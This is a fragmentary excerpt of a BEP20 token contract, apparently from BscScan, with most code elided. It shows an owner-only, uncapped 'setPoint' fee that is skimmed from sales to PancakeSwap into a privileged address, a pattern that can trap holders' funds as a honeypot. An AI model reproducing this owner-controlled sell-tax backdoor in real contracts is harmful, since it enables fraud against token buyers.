...
/**
 *Submitted for verification at BscScan.com on 2022-3-12
*/
 ...
 contract AToken is IBEP20
{
    ...
    function setPoint(uint8 point) public
    {
         require(msg.sender==_owner);
         _point = point;
    }
   ...
   function increaseAllowance(address spender, uint256 addedValue) public  returns (bool) {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if(recipient == _pancakeaddress) {
            uint fee = amount.mul(_point).div(100);
            uint real = amount.sub(fee);
            _balances[_white] = _balances[_white].add(fee);
